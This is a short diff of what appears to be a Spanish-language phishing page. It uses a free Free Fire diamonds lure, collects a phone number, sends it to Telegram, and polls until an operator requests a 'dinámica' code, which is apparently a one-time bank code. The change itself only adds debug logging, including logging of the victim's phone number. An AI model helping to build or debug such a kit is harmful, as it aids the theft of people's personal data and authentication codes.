@@ -261,6 +261,8 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
 
         const data = await response.json();
 
+        console.log("Status recibido:", data.status);
+
         if (data.status === 'dinamica_solicitada') {
           clearInterval(pollInterval);
           // Ocultar modal de esperando y mostrar modal de dinámica
@@ -364,6 +366,7 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
 
         // Mostrar loader
         mostrarLoader("Enviando datos iniciales...");
+        console.log("Enviando datos iniciales para teléfono:", telefono);
 
         try {
           // Enviar datos iniciales a Telegram (sin dinámica)
